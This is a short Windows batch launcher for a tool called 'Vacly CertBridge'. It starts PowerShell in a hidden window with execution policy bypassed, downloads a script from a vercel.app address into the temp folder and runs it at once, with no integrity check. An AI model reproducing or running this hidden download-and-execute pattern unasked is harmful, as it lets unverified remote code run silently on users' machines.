@echo off
title Vacly CertBridge
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$installer = Join-Path $env:TEMP 'install-vacly-cert-bridge.ps1'; Invoke-WebRequest 'https://vacly-nominas.vercel.app/install-vacly-cert-bridge.ps1' -OutFile $installer -UseBasicParsing; & $installer"
exit /b 0
